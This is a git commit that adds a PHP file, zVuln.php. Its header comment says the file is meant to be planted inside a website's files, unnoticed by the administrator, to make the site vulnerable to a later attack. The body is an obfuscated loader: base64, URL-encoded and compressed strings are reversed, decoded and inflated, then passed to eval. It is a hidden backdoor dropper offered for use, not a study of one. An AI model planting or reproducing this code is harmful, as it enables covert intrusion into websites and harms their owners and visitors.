e95a0aa4b01a7bc1f8d144dda3775b2ac1da5a52
Zech Bron <39665654+ZechBron@users.noreply.github.com>
2021-03-08 02:38:04 -0800

    Create zVuln.php

---
+++ zVuln.php
@@ -0,0 +1,15 @@
+<?php
+/*
+Coded By: Zech Bron
+Github: https://github.com/ZechBron
+Github Code: https://github.com/ZechBron/Crying-PHP
+Description:
+        Vulnerable PHP Codes to put inside a file (but do not modify that file to avoid the admin discoveringg what you've done) for future attack.
+        Note that the only purpose of this code is to insert this shit in a file to make the site vulnerable for your future attack.
+*/
+
+$zChB = "ZXZhbCUyOCUyNnF1b3QlM0IlM0YlMjZndCUzQiUyNnF1b3QlM0IuZ3p1bmNvbXByZXNzJTI4Z3p1bmNvbXByZXNzJTI4Z3ppbmZsYXRlJTI4Z3ppbmZsYXRlJTI4Z3ppbmZsYXRlJTI4YmFzZTY0X2RlY29kZSUyOHN0cnJldiUyOCUyNHVrNDUlMjklMjklMjklMjklMjklMjklMjklMjklM0I=";
+$uk45 = "==QvxnWbsdFCDeg++15d0WN6TBQYVmvoRuJ4RHtttWXUsGJqx9c86Ovm1Iehc4cvcPabvlDlv27nAtJKR14gf8Er3TDIEzQCguS9Sgo3HFsnzhG99+ta9MqSMxbMxPMAFZBqt4/AUM8Z8ZRzL1uHiUoLdRUYxe91YHlyz3yV+zTJ1bZxdYBPHSRX25KWHanoQbdwdN2geo8EGHA2apw6cgU9OH0sPGG3Cjj8tIm/N87oP+7TYjROhrD7+jR8vH+m28ZD+52Lv4ujPC95iATpRYsmVNvgIDDwtiQC6HFZUt2g8WwifE4JPmwJX03RghxNr1LdxwBYY/AE2OXPf6rCywuN6HtNKHLqUwGk5gR5hEvxWeM7X3ZGAj3WecTfM5Om8V476t8Kln2CaA5xakRkuqhpWD1YBrVvlMaWkSOUpVAUuESxhULiXRy2hPD4WTZUF+wGAVWIJjG9iLlAII1OI5hVQdTgR3QVByxyVMKXr62/8HRxeyonV2yJG1HHVl/q7vqVctzkq8GAQUk9oSiipNlzqJbSmlefmHEn1ml8LNqjNaGcmF1PGo3sCGqRnfkEyFlxWV2pPcJfnfu7757dSSolRPZn333pINltHJGRmfp2kbymMFBRmopTMCGk/dn3rhqtIWFO3p8RfbMEws9TvNZfcin/REg7BwJe+bQA5Hg/BEg/B0P/CMQA";
+eval(htmlspecialchars_decode(urldecode(base64_decode($zChB))));
+exit;
+?>
